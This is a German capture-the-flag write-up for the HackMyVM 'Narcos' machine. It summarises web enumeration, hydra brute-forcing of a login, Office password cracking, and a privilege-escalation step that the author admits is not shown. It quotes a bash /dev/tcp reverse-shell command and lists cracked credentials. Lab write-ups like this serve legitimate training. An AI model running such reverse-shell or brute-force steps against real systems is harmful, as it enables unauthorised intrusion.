# Narcos - HackMyVM (Easy)

![Narcos.png](Narcos.png)

## Übersicht

*   **VM:** Narcos
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Narcos)
*   **Schwierigkeit:** Easy
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 13. November 2022
*   **Original-Writeup:** https://alientec1908.github.io/Narcos_HackMyVM_Medium/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel dieser Challenge war es, Root-Rechte auf der Maschine "Narcos" zu erlangen. Der Weg dorthin begann mit der Entdeckung eines virtuellen Hosts (`management.escobar.hmv`), dessen Login-Seite (`/api/login`) anfällig für Brute-Force-Angriffe war, was zur Kompromittierung der `admin:gabriela`-Credentials führte. Nach dem Login wurde eine LFI-ähnliche Schwachstelle im Dateibrowser oder eine unzureichende Zugriffskontrolle ausgenutzt, um eine Konfigurationsdatei (`filebrowser.db`) und zwei ZIP-Archive (`personal.zip`, `works.zip`) herunterzuladen. Die `filebrowser.db` enthielt eine Command-Injection-Konfiguration, die bei Dateioperationen eine Reverse Shell auslöste. Parallel dazu enthielt die passwortgeschützte Excel-Datei `logins.xlsx` (aus `works.zip`, Passwort `money1` mit `office2john` und `john` geknackt) Zugangsdaten (`gonzalo:m3d3ll1nr0ck5`) für eine SquirrelMail-Instanz (`elcorreo.escobar.hmv`). In einer E-Mail an `gonzalo` wurde ein C-Code für eine Reverse Shell gefunden. Dieser Code wurde vermutlich auf dem Zielsystem kompiliert und über einen (nicht explizit gezeigten) Privilegieneskalations-Vektor als Root ausgeführt.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `curl`
*   `gobuster`
*   `nikto`
*   `wfuzz`
*   `hydra`
*   `unzip`
*   `office2john`
*   `john`
*   `vi`
*   Standard Linux-Befehle (`cat`, `ls`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Narcos" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web Enumeration:**
    *   IP-Adresse des Ziels (192.168.2.116) mit `arp-scan` identifiziert.
    *   `nmap`-Scan offenbarte Port 22 (SSH, OpenSSH 7.2p2) und Port 80 (HTTP, Apache 2.4.18, Titel "Escobar Store").
    *   `gobuster` auf Port 80 fand eine SquirrelMail-Installation (`/squirrelmail/`).
    *   `wfuzz` zur VHost-Enumeration fand `management.escobar.hmv`. Dieser Hostname wurde in `/etc/hosts` eingetragen.

2.  **Initial Access (via Filebrowser RCE & SquirrelMail Info Leak):**
    *   Ein Brute-Force-Angriff mit `hydra` auf `http-post-form /api/login` von `management.escobar.hmv` war erfolgreich und lieferte die Credentials `admin:gabriela`.
    *   Nach dem Login auf `management.escobar.hmv` wurden über eine Dateibrowser-Funktion (oder LFI) die Dateien `/etc/passwd` und `/files/filebrowser.db` sowie `personal.zip` und `works.zip` heruntergeladen.
    *   Die `filebrowser.db` enthielt eine Konfiguration, die bei Dateioperationen (rename, save, upload) eine Reverse Shell (`bash -i >& /dev/tcp/192.168.0.147/2222 0>&1`) als Benutzer `gonzalo` auslöste. *Dies war der primäre Weg zum Shell-Zugriff.*
    *   Parallel wurde `works.zip` untersucht. Die darin enthaltene, passwortgeschützte Datei `logins.xlsx` wurde mit `office2john` und `john` geknackt (Passwort: `money1`).
    *   `logins.xlsx` enthielt Credentials (`gonzalo:m3d3ll1nr0ck5`) für `http://elcorreo.escobar.hmv` (SquirrelMail).
    *   Nach Login bei SquirrelMail wurde in einer E-Mail an `gonzalo` von `carlos@escobar.hmv` ein C-Code für eine Reverse Shell gefunden (`escobar.c`).

3.  **Privilege Escalation (von `gonzalo` zu `root`):**
    *   Der C-Code (`escobar.c`) aus der E-Mail wurde modifiziert (Angreifer-IP angepasst), auf das Zielsystem hochgeladen (vermutlich über die bestehende `gonzalo`-Shell) und kompiliert.
    *   Durch Ausnutzung eines (nicht explizit im Log gezeigten) Privilegieneskalations-Vektors (z.B. `sudo`-Fehlkonfiguration, SUID-Binary, Cronjob) wurde die kompilierte Reverse Shell (`escobar_shell`) als `root` ausgeführt.
    *   Eine Root-Shell wurde auf einem Netcat-Listener empfangen.
    *   Die User-Flag (`S4yN0t0Drug`) und Root-Flag (`Pabl0GotY0u`) wurden gefunden.

## Wichtige Schwachstellen und Konzepte

*   **Web-Login Brute-Force:** Erfolgreiches Erraten von Admin-Credentials für eine Webanwendung (`management.escobar.hmv`).
*   **Information Disclosure (Konfigurationsdateien, ZIP-Archive):** Sensible Daten wie eine Filebrowser-Datenbank (`filebrowser.db`) und passwortgeschützte Excel-Dateien mit Logins (`logins.xlsx`) waren zugänglich.
*   **Command Injection in Filebrowser:** Die Konfiguration des Filebrowsers enthielt Befehle, die bei Dateioperationen ausgeführt wurden und eine Reverse Shell starteten.
*   **Passwort-Cracking (Office):** Das Passwort einer verschlüsselten Excel-Datei wurde mit `office2john` und `john` geknackt.
*   **Informationsleck in E-Mails:** Quellcode für eine Reverse Shell wurde in einer E-Mail gefunden.
*   **(Implizit) Unbekannter Privilegieneskalations-Vektor:** Der genaue Mechanismus, um die kompilierte C-Shell als Root auszuführen, wurde im Bericht nicht detailliert, muss aber existiert haben.

## Flags

*   **User Flag (vermutlich `/home/gonzalo/user.txt`):** `S4yN0t0Drug`
*   **Root Flag (`/root/root.txt`):** `Pabl0GotY0u`

## Tags

`HackMyVM`, `Narcos`, `Easy`, `Web Brute-Force`, `Filebrowser RCE`, `Command Injection`, `LFI` (impliziert), `Password Cracking`, `Office Password Crack`, `SquirrelMail`, `C Reverse Shell`, `Linux`, `Web`, `Privilege Escalation`, `Apache`
